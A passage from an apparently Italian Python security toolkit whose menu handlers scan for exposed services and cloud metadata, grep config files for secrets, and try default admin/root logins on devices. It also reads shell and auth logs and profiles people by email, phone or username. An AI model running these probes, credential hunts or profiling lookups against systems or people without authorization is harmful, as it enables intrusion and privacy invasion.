            except Exception: pass
        elif m==62:
            cmd=["netstat","-ano"] if self.os=="Windows" else ["ss","-tlnp"]
            try: print(subprocess.run(cmd,capture_output=True,text=True,timeout=8).stdout[:1500])
            except Exception: pass
        elif m==63:
            port=int(t) if t.isdigit() else 8080
            self.info(f"Ascolto webhook su porta {port} (timeout 30s)")
            s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
            s.bind(("0.0.0.0",port)); s.listen(3); s.settimeout(30)
            try:
                while True:
                    c,a=s.accept(); d=c.recv(4096)
                    self.ok(f"Da {a}: {d[:100]!r}")
                    c.sendall(b"HTTP/1.1 200 OK\r\n\r\n"); c.close()
            except socket.timeout: self.info("Timeout raggiunto")
            except Exception as e: self.err(str(e))
            finally: s.close()
        elif m==64:
            if os.path.exists("/proc/net/dev"):
                print("".join(open("/proc/net/dev").readlines()[2:6]))
            else:
                try: print(subprocess.run(["netstat","-e"],capture_output=True,text=True,timeout=8).stdout[:800])
                except Exception: pass
        elif m==65:
            dest=t or tempfile.mkdtemp(prefix="cyberlab_ev_"); os.makedirs(dest,exist_ok=True)
            open(os.path.join(dest,"info.json"),"w").write(json.dumps({
                "host":socket.gethostname(),"os":platform.platform(),"ts":time.time()},indent=2))
            self.ok(f"Evidenze salvate in {dest}")

    def run_cloud(self,m,t):
        if m==66:
            for p in ("/var/run/docker.sock","/run/docker.sock"):
                if os.path.exists(p): self.warn(f"{p} (mode {oct(os.stat(p).st_mode)[-4:]})")
            if os.path.exists("/proc/1/cgroup") and "docker" in open("/proc/1/cgroup").read():
                self.warn("Esecuzione in container Docker")
        elif m==67:
            ip=t or "127.0.0.1"
            for url in (f"https://{ip}:6443/api",f"http://{ip}:8080/api"):
                r=self.http(url,to=3)
                if r.get("status") in (200,401,403): self.warn(f"{url} -> {r['status']}")
        elif m==68:
            p=t or "."
            for f in glob.glob(os.path.join(p,"**/*.tf"),recursive=True)[:20]:
                for line in open(f,errors="ignore"):
                    if any(k in line.lower() for k in ("password","secret","AKIA")):
                        self.warn(f"{f}: {line.strip()[:80]}")
        elif m==69:
            url="http://169.254.169.254/latest/meta-data/"
            r=self.http(url,to=2)
            if r.get("status")==200: self.warn(f"Metadata accessibili: {url}")
            else: self.ok("Metadata non raggiungibili")
        elif m==70:
            d=t or "."
            for s in (".github/workflows",".gitlab-ci.yml",".circleci/config.yml"):
                if os.path.exists(os.path.join(d,s)): self.ok(f"Trovato {s}")
        elif m==71:
            p=t or "."
            for f in glob.glob(os.path.join(p,"**/*.yml"),recursive=True)[:20]:
                for line in open(f,errors="ignore"):
                    if any(k in line.lower() for k in ("password:","secret:","token:")):
                        self.warn(f"{f}: {line.strip()[:80]}")
        elif m==72:
            p=t if os.path.exists(t) else "/etc/nginx/nginx.conf"
            if not os.path.exists(p): self.warn(f"{p} non trovato"); return
            txt=open(p,errors="ignore").read()
            if "ssl_protocols" not in txt: self.warn("Direttiva ssl_protocols mancante")
            self.ok(f"Analisi {p} ({len(txt)} byte)")
        elif m==73:
            p=t if os.path.exists(t) else "/etc/apache2/apache2.conf"
            if not os.path.exists(p): self.warn(f"{p} non trovato"); return
            txt=open(p,errors="ignore").read()
            for pat in ("ServerSignature Off","ServerTokens Prod"):
                if pat in txt: self.ok(pat)
                else: self.warn(f"Manca '{pat}'")
        elif m==74:
            ip=t or "127.0.0.1"
            if self.probe_tcp(ip,6379,2):
                try:
                    s=socket.socket(); s.settimeout(2); s.connect((ip,6379))
                    s.send(b"PING\r\n"); r=s.recv(64); s.close()
                    if b"PONG" in r: self.warn("Redis risponde senza autenticazione")
                except Exception: pass
            else: self.ok("Redis chiuso")
        elif m==75:
            if self.probe_tcp(t or "127.0.0.1",27017,2): self.warn("MongoDB raggiungibile")
            else: self.ok("MongoDB chiuso")
        elif m==76:
            ip=t or "127.0.0.1"
            for p,n in [(3306,"MySQL"),(5432,"PostgreSQL"),(1433,"MSSQL")]:
                if self.probe_tcp(ip,p,1): self.warn(f"{n} raggiungibile")
        elif m==77:
            p=t or "."
            for f in glob.glob(os.path.join(p,"**/.env*"),recursive=True)[:5]:
                self.warn(f"Trovato {f}")
        elif m==78:
            h=self.host(t)
            try:
                with socket.create_connection((h,443),timeout=5) as sock:
                    with ssl.create_default_context().wrap_socket(sock,server_hostname=h) as ss:
                        exp=ss.getpeercert()["notAfter"]
                        import email.utils as eu
                        ts=eu.parsedate_to_datetime(exp).timestamp()
                        days=(ts-time.time())/86400
                        self.info(f"Scadenza: {exp}")
                        if days<0: self.warn(f"Certificato scaduto da {abs(days):.0f} giorni")
                        elif days<30: self.warn(f"Scade tra {days:.0f} giorni")
                        else: self.ok(f"Valido per {days:.0f} giorni")
            except Exception as e: self.err(str(e))

    def run_crypto(self,m,t):
        if m==79:
            try:
                from cryptography.fernet import Fernet
                k=Fernet.generate_key(); f=Fernet(k)
                enc=f.encrypt((t or "test").encode())
                self.ok(f"Ciphertext: {enc.decode()[:80]}...")
                self.ok(f"Plaintext: {f.decrypt(enc).decode()}")
            except ImportError: self.warn("Installare cryptography: pip3 install cryptography")
        elif m==80:
            try:
                from cryptography.hazmat.primitives.asymmetric import rsa
                from cryptography.hazmat.primitives import serialization
                k=rsa.generate_private_key(public_exponent=65537,key_size=2048)
                pem=k.private_bytes(encoding=serialization.Encoding.PEM,
                                    format=serialization.PrivateFormat.PKCS8,
                                    encryption_algorithm=serialization.NoEncryption())
                self.ok("Chiave RSA 2048 generata:"); print(pem.decode()[:300]+"...")
            except ImportError: self.warn("Installare cryptography: pip3 install cryptography")
        elif m==81:
            d=(t or "test").encode()
            self.ok(f"SHA-256: {hashlib.sha256(d).hexdigest()}")
            self.ok(f"SHA-1:   {hashlib.sha1(d).hexdigest()}")
            self.ok(f"MD5:     {hashlib.md5(d).hexdigest()}")
        elif m==82:
            d=(t or "test").encode()
            self.ok(f"Base64: {base64.b64encode(d).decode()}")
            self.ok(f"Hex:    {d.hex()}")
            self.ok(f"URL:    {urllib.parse.quote(t or 'test')}")
        elif m==83:
            n=int(t) if t.isdigit() else 24
            alpha=string.ascii_letters+string.digits+"!@#$%^&*"
            self.ok(f"Password: {''.join(secrets.choice(alpha) for _ in range(n))}")
        elif m==84:
            try:
                h=base64.urlsafe_b64encode(json.dumps({"alg":"HS256","typ":"JWT"}).encode()).rstrip(b"=")
                p=base64.urlsafe_b64encode(json.dumps({"sub":t or "user","iat":int(time.time())}).encode()).rstrip(b"=")
                s=base64.urlsafe_b64encode(hmac.new(b"secret",h+b"."+p,hashlib.sha256).digest()).rstrip(b"=")
                self.ok(f"JWT: {(h+b'.'+p+b'.'+s).decode()}")
            except Exception as e: self.err(str(e))
        elif m==85:
            pw=t or "password"; score=0
            if len(pw)>=12: score+=2
            if re.search(r"[A-Z]",pw): score+=1
            if re.search(r"[a-z]",pw): score+=1
            if re.search(r"\d",pw): score+=1
            if re.search(r"[^\w\s]",pw): score+=1
            if len(set(pw))==len(pw): score+=1
            self.ok(f"Score {score}/7 - {'DEBOLE' if score<4 else 'MEDIA' if score<6 else 'FORTE'}")
        elif m==86:
            parts=(t or "").split(":",1)
            if len(parts)!=2: self.warn("Formato: <msg>:<sig>"); return
            msg,sig=parts
            calc=hmac.new(b"secret",msg.encode(),hashlib.sha256).hexdigest()
            if hmac.compare_digest(calc,sig): self.ok("Firma valida")
            else: self.warn("Firma non valida")
        elif m==87:
            s=b"cyberlab_salt"
            self.ok(f"SHA-256(salt+msg): {hashlib.sha256(s+(t or 'test').encode()).hexdigest()}")
        elif m==88:
            key=hashlib.sha256(b"cyberlab_vault").digest()
            enc=bytes(b^key[i%len(key)] for i,b in enumerate((t or "test").encode()))
            self.ok(f"Cifrato: {base64.b64encode(enc).decode()}")

    def run_utils(self,m,t):
        if m==89:
            if not os.path.exists(t): self.warn("Path database richiesto"); return
            try:
                c=sqlite3.connect(t); cur=c.cursor()
                for (tb,) in cur.execute("SELECT name FROM sqlite_master WHERE type='table'"):
                    self.info(f"Tabella: {tb}")
                    for r in cur.execute(f"SELECT * FROM '{tb}' LIMIT 5"): print("  ",r)
                c.close()
            except Exception as e: self.err(str(e))
        elif m==90:
            t0=time.time(); sum(i*i for i in range(10**6)); self.ok(f"Somma quadrati: {time.time()-t0:.3f}s")
            t0=time.time(); hashlib.sha256(b"x"*10**6).hexdigest(); self.ok(f"SHA-256 1MB: {time.time()-t0:.3f}s")
        elif m==91:
            u=shutil.disk_usage(t or "/")
            self.ok(f"Totale {u.total//2**30}GB, usato {u.used//2**30}GB, libero {u.free//2**30}GB")
        elif m==92:
            try: print(subprocess.run(["git","status","--short"],capture_output=True,text=True,timeout=5,cwd=t or ".").stdout[:1000] or "(nessuna modifica)")
            except Exception as e: self.err(str(e))
        elif m==93:
            try:
                if os.path.exists(t): self.ok(json.dumps(json.load(open(t)),indent=2)[:1500])
                else: self.ok(json.dumps(json.loads(t),indent=2)[:1500])
            except Exception: self.warn("JSON o path non valido")
        elif m==94:
            if not os.path.exists(t): self.warn("File richiesto"); return
            with open(t,"rb") as fi, gzip.open(t+".gz","wb") as fo: shutil.copyfileobj(fi,fo)
            self.ok(f"Compresso in {t}.gz")
        elif m==95:
            parts=(t or "").split(":")
            if len(parts)!=2: self.warn("Formato: <lport>:<rhost,rport>"); return
            try:
                lp=int(parts[0]); rh,rp=parts[1].split(",") if "," in parts[1] else (parts[1],80)
                srv=socket.socket(); srv.bind(("127.0.0.1",lp)); srv.listen(1)
                self.info(f"Forward 127.0.0.1:{lp} -> {rh}:{rp}")
                c,_=srv.accept(); r=socket.create_connection((rh,int(rp)),timeout=3)
                c.settimeout(2); r.settimeout(2)
                while True:
                    try:
                        d=c.recv(4096)
                        if not d: break
                        r.sendall(d); e=r.recv(4096)
                        if not e: break
                        c.sendall(e)
                    except Exception: break
                c.close(); r.close(); srv.close()
            except Exception as e: self.err(str(e))
        elif m==96:
            port=int(t) if t and t.isdigit() else 8000
            h=http.server.SimpleHTTPRequestHandler
            try:
                with socketserver.TCPServer(("",port),h) as httpd:
                    self.ok(f"HTTP server attivo su 0.0.0.0:{port}")
                    httpd.serve_forever()
            except KeyboardInterrupt: self.info("Server fermato")
            except Exception as e: self.err(str(e))
        elif m==97:
            if not t.startswith("http"): self.warn("URL richiesto"); return
            body=json.dumps({"tool":"CyberLab","ts":time.time()}).encode()
            r=self.http(t,method="POST",data=body,headers={"Content-Type":"application/json"},to=5)
            self.ok(f"Status {r.get('status','err')}")
        elif m==98:
            self.info("Linux:  script -a sessione.log")
            self.info("Windows: Start-Transcript -Path sessione.log")
        elif m==99:
            self.ok(f"Host: {socket.gethostname()}")
            self.ok(f"OS: {platform.platform()}")
            self.ok(f"Python: {platform.python_version()}")
            self.ok(f"CPU: {os.cpu_count()} core")
        elif m==100:
            for n,f in [("socket",lambda:socket.gethostbyname("localhost")),
                       ("hash",lambda:hashlib.sha256(b"x").hexdigest()),
                       ("json",lambda:json.dumps({"a":1})),
                       ("ssl",lambda:ssl.create_default_context()),
                       ("sqlite",lambda:sqlite3.connect(":memory:"))]:
                try: f(); self.ok(f"{n}: OK")
                except Exception as e: self.err(f"{n}: {e}")

    def _wif(self):
        try:
            r=subprocess.run(["netsh","wlan","show","interfaces"] if self.os=="Windows"
                             else ["iwconfig"],capture_output=True,text=True,timeout=5)
            return r.stdout[:800] or "(nessuna informazione)"
        except Exception: return "(comando non disponibile)"
    def run_wireless(self,m,t):
        if m==101:
            self.sim("Wi-Fi beacon flood richiede iniezione raw 802.11"); print(self._wif())
        elif m==102:
            self.info("Scansione BLE:")
            try: print(subprocess.run(["bluetoothctl","list"],capture_output=True,text=True,timeout=3).stdout[:600] or "(bluetoothctl assente)")
            except Exception: self.warn("BlueZ non installato")
        elif m==103:
            caps=glob.glob("*.cap")+glob.glob("*.pcap")
            for c in caps: self.ok(c)
            if not caps: self.warn("Nessun file .cap/.pcap trovato")
        elif m==104:
            self.sim("RTL-SDR richiede dongle hardware")
            try: print(subprocess.run(["rtl_test","-t"],capture_output=True,text=True,timeout=3).stdout[:200])
            except Exception: self.warn("rtl_test non trovato")
        elif m==105:
            self.sim("Deauth richiede monitor mode"); print(self._wif())
        elif m==106:
            self.sim("WPS check richiede wash")
            try: print(subprocess.run(["wash","-i","wlan0"],capture_output=True,text=True,timeout=3).stdout[:400])
            except Exception: self.warn("wash non trovato")
        elif m==107:
            self.sim("BT spoof check richiede hciconfig")
            try: print(subprocess.run(["hciconfig"],capture_output=True,text=True,timeout=3).stdout[:400])
            except Exception: self.warn("hciconfig assente")
        elif m==108:
            self.sim("RF noise floor richiede SDR hardware")
        elif m==109:
            info=self._wif(); print(info)
            if "Monitor" in info: self.ok("Monitor mode attivo")
            else: self.warn("Monitor mode non attivo")
        elif m==110:
            self.sim("Zigbee richiede coordinatore CC2531")
        elif m==111:
            try:
                r=subprocess.run(["nmcli","-f","SSID","dev","wifi"] if self.os!="Windows"
                                 else ["netsh","wlan","show","networks"],capture_output=True,text=True,timeout=6)
                from collections import Counter
                ssids=re.findall(r"SSID\s*\d*\s*:?\s*(\S+)",r.stdout)
                for s,c in Counter(ssids).items():
                    if c>1: self.warn(f"SSID duplicato: {s} ({c} reti)")
            except Exception as e: self.err(str(e))
        elif m==112:
            self.sim("Probe logger richiede monitor mode"); print(self._wif())
        elif m==113:
            try: print(subprocess.run(["gpspipe","-w","-n","3"],capture_output=True,text=True,timeout=3).stdout[:400])
            except Exception: self.warn("gpsd assente")
        elif m==114:
            self.sim("NFC cloner richiede PN532/ACR122U")
            try: print(subprocess.run(["nfc-list"],capture_output=True,text=True,timeout=3).stdout[:300])
            except Exception: self.warn("nfc-list assente")
        elif m==115:
            self.sim("IR replay richiede LIRC hardware")
        elif m==116:
            self.sim("LoRaWAN richiede concentratore SX1301")
        elif m==117:
            self.sim("Honeypot SSID richiede monitor mode")
        elif m==118:
            try:
                r=subprocess.run(["nmcli","-f","CHAN","dev","wifi"],capture_output=True,text=True,timeout=6)
                from collections import Counter
                for ch,c in Counter(re.findall(r"\b(\d{1,2})\b",r.stdout)).most_common(10):
                    print(f"   Canale {ch}: {c} reti")
            except Exception: self.warn("nmcli assente")
        elif m==119:
            try: print(subprocess.run(["nmcli","-f","BSSID,SSID","dev","wifi"],capture_output=True,text=True,timeout=6).stdout[:800])
            except Exception: self.warn("nmcli assente")
        elif m==120:
            info=self._wif(); score=100
            if "WEP" in info: score-=40
            if "open" in info.lower(): score-=30
            self.ok(f"Score sicurezza: {max(0,score)}/100")

    def run_iot(self,m,t):
        if m==121:
            if not os.path.exists(t): self.warn("Path firmware richiesto"); return
            head=open(t,"rb").read(16)
            magics={b"\x7fELF":"ELF",b"MZ":"PE",b"\x1f\x8b":"GZIP",b"\xfd7zXZ":"XZ",b"HSQS":"SquashFS"}
            for mg,n in magics.items():
                if head.startswith(mg): self.ok(f"Magic: {n}"); return
            self.info(f"Magic sconosciuto: {head.hex()}")
        elif m==122:
            for d in glob.glob("/dev/ttyUSB*")+glob.glob("/dev/ttyACM*")+glob.glob("/dev/ttyS*"): self.ok(d)
        elif m==123: self.sim("JTAG scan richiede hardware dedicato")
        elif m==124:
            base=t if t.startswith("http") else f"http://{t}"
            for u,p in [("admin","admin"),("admin",""),("root","root")]:
                req=urllib.request.Request(base)
                req.add_header("Authorization","Basic "+base64.b64encode(f"{u}:{p}".encode()).decode())
                try:
                    if urllib.request.urlopen(req,timeout=2,context=ssl._create_unverified_context()).status==200:
                        self.warn(f"Credenziali funzionanti: {u}:{p}"); return
                except Exception: pass
            self.ok("Nessuna credenziale default accettata")
        elif m==125:
            try:
                s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.settimeout(3)
                s.sendto(b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n',("239.255.255.250",1900))
                while True:
                    try:
                        d,_=s.recvfrom(2048); self.ok(d.decode("latin1").splitlines()[0])
                    except socket.timeout: break
            except Exception as e: self.err(str(e))
        elif m==126:
            ip=t or "127.0.0.1"
            if self.probe_tcp(ip,502,2): self.warn("Modbus porta 502 aperta")
            else: self.ok("Modbus chiuso")
        elif m==127:
            ip=t or "127.0.0.1"
            try:
                s=socket.socket(); s.settimeout(2); s.connect((ip,1883))
                s.send(b"\x10\x10\x00\x04MQTT\x04\x02\x00\x3c\x00\x00")
                r=s.recv(64); s.close()
                if r and r[0]==0x20: self.warn("MQTT anonimo forse abilitato")
            except Exception: self.ok("MQTT chiuso")
        elif m==128:
            ip=t or "127.0.0.1"
            try:
                s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.settimeout(2)
                s.sendto(b"\x40\x01\x00\x00",(ip,5683)); r,_=s.recvfrom(1024)
                self.ok(f"CoAP risposta: {r[:40]!r}")
            except Exception: self.ok("CoAP non risponde")
        elif m==129:
            if self.probe_tcp(t or "127.0.0.1",23,2): self.warn("Telnet aperto")
            else: self.ok("Telnet chiuso")
        elif m==130:
            ip=t or "127.0.0.1"
            try:
                s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.settimeout(2)
                for c in (b"public",b"private"):
                    s.sendto(b"\x30\x0c\x02\x01\x00\x04\x06"+c+b"\xa0\x00",(ip,161))
                    try: s.recvfrom(1024); self.ok(f"Community '{c.decode()}' risponde")
                    except socket.timeout: pass
            except Exception: pass
        elif m==131:
            if not os.path.exists(t): self.warn("Path firmware richiesto"); return
            for k in re.findall(rb"-----BEGIN [A-Z ]+-----",open(t,"rb").read())[:3]: self.ok(k.decode())
        elif m==132: self.sim("Estrazione NVRAM dipende da hardware specifico")
        elif m==133:
            if self.probe_tcp(t or "127.0.0.1",554,2): self.warn("RTSP aperto")
            else: self.ok("RTSP chiuso")
        elif m==134: self.sim("Smart meter richiede protocollo DLMS/COSEM")
        elif m==135:
            if os.path.exists("/dev/watchdog"): self.warn("/dev/watchdog presente")
            else: self.ok("Nessun /dev/watchdog")

    def run_forensics(self,m,t):
        if m==136:
            if t and os.path.exists(t):
                d=open(t,"rb").read(2**20)
                self.ok(f"SHA-256 (1MB): {hashlib.sha256(d).hexdigest()[:40]}")
            else: self.warn("Path immagine RAM richiesto")
        elif m==137:
            if t and os.path.exists(t):
                for s in re.findall(rb"[\x20-\x7e]{5,}",open(t,"rb").read(2**16))[:25]: print("   ",s.decode("latin1"))
        elif m==138:
            cmd=["netstat","-ano"] if self.os=="Windows" else ["ss","-tunap"]
            try: print(subprocess.run(cmd,capture_output=True,text=True,timeout=8).stdout[:1500])
            except Exception: pass
        elif m==139:
            base=t or "."; files=[]
            for root,_,fs in os.walk(base):
                for f in fs:
                    try: files.append((os.path.getsize(os.path.join(root,f)),os.path.join(root,f)))
                    except Exception: pass
                if len(files)>3000: break
            for sz,fp in sorted(files,reverse=True)[:20]: print(f"   {sz//1024}KB {fp}")
        elif m==140:
            for p in [os.path.expanduser("~/.mozilla/firefox"),os.path.expanduser("~/.config/google-chrome"),
                      os.path.expanduser("~/AppData/Local/Google/Chrome/User Data")]:
                if os.path.exists(p):
                    self.ok(p)
                    for f in glob.glob(os.path.join(p,"**/*History*"),recursive=True)[:2]: self.info(f"  {f}")
        elif m==141:
            if self.os=="Windows" and os.path.isdir(r"C:\Windows\Prefetch"):
                for f in os.listdir(r"C:\Windows\Prefetch")[:20]: print("  ",f)
            else: self.info("Prefetch disponibile solo su Windows")
        elif m==142:
            if self.os!="Windows": self.warn("Registry disponibile solo su Windows"); return
            try:
                import winreg
                k=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r"SOFTWARE\Microsoft\Windows\CurrentVersion")
                i=0
                while i<15:
                    try: n,v,_=winreg.EnumValue(k,i); print(f"  {n}={v}"); i+=1
                    except OSError: break
            except Exception as e: self.err(str(e))
        elif m==143:
            for p in ["~/.bash_history","/var/log/auth.log"]:
                p=os.path.expanduser(p)
                if os.path.exists(p):
                    self.ok(f"{p} ({os.path.getsize(p)} byte)")
                    try: print("".join(open(p,errors="ignore").readlines()[-8:]))
                    except Exception: pass
        elif m==144:
            if self.os=="Windows":
                try: print(subprocess.run(["reg","query",r"HKLM\SYSTEM\CurrentControlSet\Enum\USB"],capture_output=True,text=True,timeout=8).stdout[:1000])
                except Exception: pass
            else:
                try:
                    r=subprocess.run(["dmesg"],capture_output=True,text=True,timeout=5)
                    print("\n".join([l for l in r.stdout.splitlines() if "usb" in l.lower()][-12:]))
                except Exception: pass
        elif m==145:
            if not t or not os.path.exists(t): self.warn("Path file regole richiesto"); return
            pats=[l.strip() for l in open(t) if l.strip()]
            for root,_,fs in os.walk("."):
                for f in fs:
                    try:
                        d=open(os.path.join(root,f),"rb").read(65536)
                        for p in pats:
                            if p.encode() in d: self.warn(f"Match '{p}' in {f}")
                    except Exception: pass
                break
        elif m==146:
            if not t or not os.path.exists(t): self.warn("Path file PE richiesto"); return
            d=open(t,"rb").read(512)
            if d[:2]==b"MZ":
                self.ok("File PE valido")
                e=struct.unpack("<I",d[0x3c:0x40])[0]
                if open(t,"rb").read(e+6)[e:e+4]==b"PE\x00\x00": self.info("NT header valido")
            else: self.warn("Non è un file PE")
        elif m==147:
            if not t or not os.path.exists(t): self.warn("Path documento richiesto"); return
            try:
                with zipfile.ZipFile(t) as z:
                    mac=[n for n in z.namelist() if "vbaProject" in n]
                    if mac: self.warn(f"Macro trovate: {mac}")
                    else: self.ok("Nessuna macro")
            except Exception as e: self.err(str(e))
        elif m==148:
            if not t or not os.path.exists(t): self.warn("Path file zip richiesto"); return
            try:
                with zipfile.ZipFile(t) as z:
                    tot=sum(i.file_size for i in z.infolist())
                    comp=sum(i.compress_size for i in z.infolist())
                    r=tot/max(1,comp)
                    self.info(f"Ratio compressione: {r:.1f}x")
                    if r>100: self.warn("Sospetto zip bomb")
                    else: self.ok("Ratio nella norma")
            except Exception as e: self.err(str(e))
        elif m==149:
            if not t or not os.path.exists(t): self.warn("Path device richiesto"); return
            d=open(t,"rb").read(512)
            if d[510:512]==b"\x55\xaa":
                self.ok("MBR valido")
                for i in range(4):
                    e=d[0x1BE+i*16:0x1BE+(i+1)*16]
                    if e[4]: self.info(f"Partizione {i+1}: tipo 0x{e[4]:02x}")
            else: self.info(f"Non-MBR, magic: {d[510:512].hex()}")
        elif m==150:
            dest=t or os.path.join(tempfile.gettempdir(),"cyberlab_custody.log")
            prev=""
            if os.path.exists(dest): prev=open(dest).read().splitlines()[-1][:100]
            entry=f"{time.time()}|{socket.gethostname()}|{getpass.getuser()}|prev={prev[:16]}"
            sig=hashlib.sha256((prev+entry).encode()).hexdigest()[:32]
            with open(dest,"a") as f: f.write(entry+"|sig="+sig+"\n")
            self.ok(f"Catena aggiornata: {sig}")

    def run_osint(self,m,t):
        if m==151:
            try:
                import phonenumbers
                from phonenumbers import geocoder,carrier,number_type
            except ImportError:
                self.warn("Installare phonenumbers: pip3 install phonenumbers"); return
            try: n=phonenumbers.parse((t or "").strip(),None)
            except Exception as e: self.err(f"Numero non valido: {e}"); return
            if not phonenumbers.is_valid_number(n): self.warn("Numero non valido")
            self.ok(f"E.164: {phonenumbers.format_number(n,phonenumbers.PhoneNumberFormat.E164)}")
            self.ok(f"Nazionale: {phonenumbers.format_number(n,phonenumbers.PhoneNumberFormat.NATIONAL)}")
            self.info(f"Paese: {geocoder.description_for_number(n,'it') or 'non disponibile'}")
            self.info(f"Operatore: {carrier.name_for_number(n,'it') or 'non disponibile'}")
            tmap={0:"FISSO",1:"MOBILE",2:"FISSO/MOBILE",3:"TOLL_FREE",4:"PREMIUM",6:"VOIP",27:"SCONOSCIUTO"}
            self.info(f"Tipo linea: {tmap.get(number_type(n),'SCONOSCIUTO')}")
            self.warn("Il nome del proprietario non è ottenibile da fonti legali gratuite")
        elif m==152:
            email=(t or "").strip().lower()
            if "@" not in email: self.err("Email non valida"); return
            req=urllib.request.Request(f"https://emailrep.io/{urllib.parse.quote(email)}",
                                       headers={"User-Agent":self.UA,"Accept":"application/json"})
            try:
                d=json.loads(urllib.request.urlopen(req,timeout=10).read().decode())
            except urllib.error.HTTPError as e:
                if e.code==401: self.warn("Richiede API key: https://emailrep.io/key")
                else: self.err(f"HTTP {e.code}")
                return
            except Exception as e: self.err(str(e)); return
            self.ok(f"Reputazione: {d.get('reputation')}")
            self.warn(f"Sospetto: {d.get('suspicious')}")
            det=d.get("details",{})
            self.info(f"Dominio: {det.get('domain','non disponibile')}")
            self.info(f"Breach noti: {det.get('breaches',[])}")
            self.info(f"Profili social: {det.get('profiles',[])}")
            self.info(f"Ultimo avvistamento: {det.get('last_seen','non disponibile')}")
        elif m==153:
            user=(t or "").strip(); sites={"GitHub":f"https://github.com/{user}",
                "Twitter/X":f"https://x.com/{user}","Instagram":f"https://instagram.com/{user}",
                "Reddit":f"https://reddit.com/user/{user}","Telegram":f"https://t.me/{user}",
                "Pinterest":f"https://pinterest.com/{user}","Dev.to":f"https://dev.to/{user}"}
            found=[]
            for name,url in sites.items():
                try:
                    r=urllib.request.urlopen(urllib.request.Request(url,headers={"User-Agent":self.UA}),timeout=5)
                    if r.status==200: self.ok(f"{name}: {url}"); found.append(name)
                except urllib.error.HTTPError as e:
                    if e.code!=404: self.info(f"{name}: HTTP {e.code}")
                except Exception: continue
            self.info(f"Profili trovati: {len(found)}/{len(sites)}")
            self.info(f"Per analisi più approfondita: pip3 install maigret && maigret {user}")
        elif m==154:
            email=(t or "").strip().lower()
            req=urllib.request.Request(f"https://emailrep.io/{urllib.parse.quote(email)}",
                                       headers={"User-Agent":self.UA})
            try:
                d=json.loads(urllib.request.urlopen(req,timeout=10).read().decode())
                bs=d.get("details",{}).get("breaches",[])
                if bs:
                    self.warn(f"Breach trovati ({len(bs)}):")
                    for b in bs: print("   ",b)
                else: self.ok("Nessun breach noto")
            except Exception as e: self.err(str(e))
        elif m==155:
            key=os.environ.get("NUMVERIFY_KEY","")
            if not key: self.warn("Richiede API key gratuita: https://numverify.com"); return
            url=f"http://apilayer.net/api/validate?access_key={key}&number={urllib.parse.quote(t or '')}"
            try:
                d=json.loads(urllib.request.urlopen(urllib.request.Request(url,headers={"User-Agent":self.UA}),timeout=10).read().decode())
                if d.get("valid"):
                    for k in ("country_name","location","carrier","line_type"):
                        self.ok(f"{k}: {d.get(k)}")
                else: self.warn("Numero non valido")
            except Exception as e: self.err(str(e))
        elif m==156:
            email=(t or "").strip().lower(); h=hashlib.md5(email.encode()).hexdigest()
            self.info(f"MD5 Gravatar: {h}")
            try:
                r=urllib.request.urlopen(urllib.request.Request(f"https://www.gravatar.com/avatar/{h}?d=404",
                                                                headers={"User-Agent":self.UA}),timeout=5)
                if r.status==200:
                    self.ok("Profilo Gravatar esistente")
                    prof=json.loads(urllib.request.urlopen(
                        urllib.request.Request(f"https://www.gravatar.com/{h}.json",
                                               headers={"User-Agent":self.UA}),timeout=5).read().decode())
                    entry=(prof.get("entry") or [{}])[0]
                    for k in ("displayName","preferredUsername","name","aboutMe","thumbnailUrl"):
                        if k in entry: self.info(f"{k}: {entry[k]}")
            except urllib.error.HTTPError as e:
                if e.code==404: self.warn("Nessun profilo Gravatar associato")
                else: self.err(f"HTTP {e.code}")
            except Exception as e: self.err(str(e))
        elif m==157:
            email=(t or "").strip(); self.info(f"Verifica registrazioni per {email}")
            try:
                if shutil.which("holehe"):
                    r=subprocess.run(["holehe",email,"--only-used","--no-color"],
                                     capture_output=True,text=True,timeout=60)
                    print((r.stdout or r.stderr)[-2500:])
                else:
                    self.warn("Installare holehe (opzionale): pip3 install holehe")
                    for n,u in [("Twitter","https://twitter.com/account/begin_password_reset"),
                                ("Instagram","https://www.instagram.com/accounts/password/reset/")]:
                        self.info(f"{n}: {u}")
            except Exception as e: self.err(str(e))
        elif m==158:
            enc=urllib.parse.quote(t or "")
            self.info(f"Ricerca '{t}' - link diretti:")
            for n,u in [("Google",f"https://www.google.com/search?q={enc}"),
                        ("LinkedIn",f"https://www.linkedin.com/search/results/people/?keywords={enc}"),
                        ("Facebook",f"https://www.facebook.com/search/top/?q={enc}"),
                        ("Bing",f"https://www.bing.com/search?q={enc}")]:
                print(f"   {n:10} {u}")
            self.warn("Nessuna API gratuita fornisce nome e cognome completo")
        elif m==159:
            try:
                import phonenumbers
                n=phonenumbers.parse((t or "").strip(),None)
                e164=phonenumbers.format_number(n,phonenumbers.PhoneNumberFormat.E164)
            except ImportError: self.warn("Installare phonenumbers: pip3 install phonenumbers"); return
            except Exception as e: self.err(str(e)); return
            self.info(f"Numero normalizzato: {e164}")
            enc=urllib.parse.quote(e164)
            for n_,u in [("Google",f"https://www.google.com/search?q={enc}"),
                         ("DuckDuckGo",f"https://duckduckgo.com/?q={enc}"),
                         ("GitHub",f"https://github.com/search?q={enc}&type=code"),
                         ("Truecaller",f"https://www.truecaller.com/search/it/{e164.lstrip('+')}")]:
                print(f"   {n_:12} {u}")
        elif m==160:
            self.info(f"Aggregatore OSINT: {t}")
            if "@" in (t or ""):
                print("\n--- EMAIL ---"); self.run_osint(152,t)
                print("\n--- GRAVATAR ---"); self.run_osint(156,t)
            elif (t or "").startswith("+") or ((t or "").replace(" ","").replace("-","").isdigit() and len(t or "")>=8):
                print("\n--- PHONE ---"); self.run_osint(151,t)
                print("\n--- SOCIAL ---"); self.run_osint(159,t)
            else:
                print("\n--- USERNAME ---"); self.run_osint(153,t)
                print("\n--- NAME ---"); self.run_osint(158,t)

    def run_simulation(self,m,t):
        RED="\033[91m"; BOLD="\033[1m"; G="\033[92m"; R="\033[0m"
        def confirm():
            print(f"{BOLD}{RED}ATTENZIONE: SIMULAZIONE VISIVA DI TEST{R}")
            print("Nessuna operazione reale sul sistema. Solo output visivo a scopo dimostrativo.")
            print("CTRL+C per interrompere in qualsiasi momento.")
